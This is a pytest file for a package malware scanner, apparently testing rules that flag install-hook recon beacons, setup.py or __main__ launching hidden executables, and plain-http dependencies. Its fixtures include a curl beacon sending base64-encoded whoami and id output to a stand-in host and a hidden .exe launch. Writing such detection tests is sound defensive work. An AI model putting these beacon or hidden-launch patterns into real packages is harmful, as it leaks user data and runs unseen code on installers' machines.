"""Research 2026-11-22: four package install/start-up shapes, each paired with a look-alike.

Sanitized fixtures only (``.invalid``/``.test`` hosts, inert content).

* ``ST-NPM-INSTALL-RECON-BEACON`` -- install command: machine query, base64, curl to a URL.
* ``ST-PY-SETUP-EXE-LAUNCH`` -- setup.py install command that starts an .exe.
* ``ST-PY-MAIN-BUNDLED-EXE-HIDDEN`` -- __main__ starting a bundled .exe hidden or detached.
* ``ST-PY-DEP-PLAIN-HTTP-URL`` -- dependency declared as a direct reference to plain http.
"""

from __future__ import annotations

from pathlib import Path

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory

_CORPUS = Path(__file__).resolve().parent / "eval_corpus"

_PAIRS = [
    ("ST-NPM-INSTALL-RECON-BEACON", "npm-preinstall-id-output-curl-beacon",
     ["id-piped-to-file", "curl-download-only"]),
    ("ST-PY-SETUP-EXE-LAUNCH", "setup-py-install-cmd-override-embedded-exe",
     ["install-override-copies-data", "exe-as-package-data"]),
    ("ST-PY-MAIN-BUNDLED-EXE-HIDDEN", "module-run-embedded-infostealer-exe",
     ["runs-system-tool", "bundled-exe-visible-wait"]),
    ("ST-PY-DEP-PLAIN-HTTP-URL", "fake-http-dependency-download-beacon",
     ["https-direct-reference", "loopback-http-reference"]),
]


def _report(root: Path):
    return analyze_directory(root, detect_component(root, source=str(root)))


def _ids(root: Path) -> set[str]:
    return {f.id for f in _report(root).findings}


def test_each_attack_flagged_and_lookalikes_clean():
    for rule_id, tech, negs in _PAIRS:
        report = _report(_CORPUS / "positive" / "AST02" / tech / "probe-shape")
        finding = next((f for f in report.findings if f.id == rule_id), None)
        assert finding is not None, f"{rule_id} missed its positive"
        assert finding.evidence
        assert report.verdict.get("has_malicious_indicators") is True
        for neg in negs:
            assert rule_id not in _ids(_CORPUS / "negative" / "AST02" / tech / neg), neg


def test_recon_beacon_reversed_order_and_shell_script(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"name": "x", "version": "1.0.0", "scripts": {"install": "sh ./i.sh"}}', encoding="utf-8"
    )
    (tmp_path / "i.sh").write_text(
        "# FIXTURE ONLY - synthetic detection test sample, not real malware\n"
        'curl -s "https://bin.request-bin.test/x?d=$(whoami | base64)"\n', encoding="utf-8"
    )
    assert "ST-NPM-INSTALL-RECON-BEACON" in _ids(tmp_path)


def test_recon_beacon_needs_lifecycle_script(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"name": "x", "version": "1.0.0", "scripts": {"report": '
        '"id | base64 | curl -s -d @- https://bin.request-bin.test/x"}}', encoding="utf-8"
    )
    assert "ST-NPM-INSTALL-RECON-BEACON" not in _ids(tmp_path)


def test_main_exe_needs_hidden_flag_and_anchor(tmp_path):
    (tmp_path / "__main__.py").write_text(
        "# FIXTURE ONLY - synthetic detection test sample, not real malware\n"
        "import subprocess\n"
        'subprocess.Popen(["C:/tools/helper.exe"], creationflags=0x08000000)\n', encoding="utf-8"
    )
    assert "ST-PY-MAIN-BUNDLED-EXE-HIDDEN" not in _ids(tmp_path)


def test_plain_http_reference_in_setup_cfg_and_comment(tmp_path):
    (tmp_path / "setup.cfg").write_text(
        "# FIXTURE ONLY - synthetic detection test sample, not real malware\n"
        "[options]\ninstall_requires =\n    # old-dep @ http://old.invalid/x.tar.gz\n"
        "    helper-core @ http://tracker.invalid/h.tar.gz\n", encoding="utf-8"
    )
    report = _report(tmp_path)
    finding = next(f for f in report.findings if f.id == "ST-PY-DEP-PLAIN-HTTP-URL")
    assert len(finding.evidence) == 1
